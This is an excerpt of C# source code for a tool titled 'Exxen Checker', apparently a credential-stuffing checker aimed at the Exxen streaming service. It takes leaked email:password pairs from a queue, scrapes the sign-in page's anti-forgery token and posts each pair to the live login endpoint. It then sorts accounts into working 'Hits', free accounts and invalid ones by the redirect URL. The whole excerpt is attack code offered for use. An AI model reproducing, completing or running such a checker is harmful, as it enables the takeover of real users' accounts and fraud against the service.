...
namespace ScriptHUB
{
    internal class Checker_Main
    {
        ...
        static string myTitle = "Exxen Checker [->] 🔥 ! Muhammed 🔥";
            ...
            if (flag)
            {
                ...
                while (coqueue.Count > 0)
                {
                    ...
                    try
                    {
                        ...
                        string tokenurl = httpRequest.Get("https://www.exxen.com/tr/sign-in").ToString();

                        string token = Parse(tokenurl, "name=\"__RequestVerificationToken\" type=\"hidden\" value=\"", "\"");

                        string postdata = "__RequestVerificationToken=" + token + "&__reCAPTCHAVerificationToken=&returnUrl=&Email=" + array[0] + "&Password=" + array[1] + "&RememberMe=true";

                        string login = httpRequest.Post("https://www.exxen.com/tr/sign-in", postdata, "application/x-www-form-urlencoded").ToString();
                        string responseurl = httpRequest.Response.Address.ToString();

                        //Hits
                        if (responseurl.Contains("https://www.exxen.com/tr/profile/select"))
                        {
                        ...
                        //Free-Custom
                        if (responseurl.Contains("https://www.exxen.com/tr/packages/order-info"))
                        {
                        ...
                        if (responseurl.Contains("https://www.exxen.com/tr/sign-in"))
                        {
                            invalids++;
                            GlobalData.LastChecks++;
                        }
